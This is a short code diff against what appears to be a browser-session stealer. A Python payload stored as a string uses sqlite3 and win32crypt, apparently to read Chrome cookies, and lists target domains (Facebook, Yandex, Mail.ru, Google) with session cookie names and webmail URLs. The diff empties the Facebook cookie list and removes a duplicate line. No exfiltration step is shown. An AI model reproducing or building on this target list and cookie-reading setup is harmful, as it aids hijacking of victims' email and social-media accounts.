@@ -4,7 +4,7 @@ r_source = r"""
 import sqlite3
 import win32crypt
 urls = {
-    '.facebook.com': ('datr', 'c_user', 'xs'),
+    '.facebook.com': (),
     '.yandex.com': (),
     '.yandex.ru': (),
     '.mail.ru': (),
@@ -47,7 +47,6 @@ def chrome_sessions(sessions):
         u'.facebook.com': u'https://www.facebook.com',
         u'.mail.ru': u'https://e.mail.ru',
         u'.yandex.com': u'https://mail.yandex.com',
-        u'.yandex.ru': u'https://mail.yandex.ru',
         u'.yandex.ru': u'https://mail.yandex.ru',
         u'.google.com': u'https://mail.google.com',
         u'accounts.google.com': u'https://mail.google.com',
